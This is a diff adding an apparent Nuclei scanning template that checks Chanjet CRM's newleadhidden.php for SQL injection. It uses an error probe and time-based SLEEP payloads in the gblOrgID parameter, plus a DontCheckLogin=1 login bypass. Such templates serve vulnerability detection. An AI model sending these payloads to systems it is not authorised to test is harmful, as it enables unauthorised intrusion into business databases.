@@ -1,0 +1,50 @@
+id: poc-yaml-changjie-crm-newleadhidden-php-sqli
+info:
+  name: "畅捷通CRM newleadhidden.php SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 畅捷通CRM
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "initial-check"
+    method: GET
+    path:
+      - "{{BaseURL}}/lead/newleadhidden.php?gblOrgID=1'&DontCheckLogin=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Fatal error"
+
+  - id: "sqli-check"
+    method: GET
+    path:
+      - "{{BaseURL}}/lead/newleadhidden.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1"
+      - "{{BaseURL}}/lead/newleadhidden.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(8)))HAjH)--+-&DontCheckLogin=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"select\":"
+          - "Lead"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
